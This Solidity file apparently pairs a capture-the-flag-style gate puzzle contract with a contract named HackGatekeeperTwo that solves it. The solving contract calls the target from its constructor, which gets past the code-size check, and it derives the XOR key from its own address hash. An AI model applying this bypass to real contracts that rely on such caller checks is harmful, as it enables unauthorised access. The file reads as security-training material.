pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract HackGatekeeperTwo {

    address toHackAddress = 0xc6fd4adb56348a6c9880e8e5ffc4701fcb6dfe54;
    bytes8 gateKey = 0x18911F98;
    // CALL FROM CONSTRUCTOR !!!
    
    function HackGatekeeperTwo() {
        GatekeeperTwo gate = GatekeeperTwo(toHackAddress);
        address a = address(this);
        uint64 senderHash = uint64(keccak256(a));
        uint64 biggest = uint64(0) - 1;
        uint64 invertedHash = biggest - senderHash;
        bytes8 key = bytes8(invertedHash);
        uint64 invertedKey = uint64(key);
        uint64 xored = senderHash ^ invertedKey ; 
        gate.enter(key);
    }
    
    function check() view public returns (uint64) {
        uint64 num1 = 1;
        return uint64(0) - 1; 
    }
}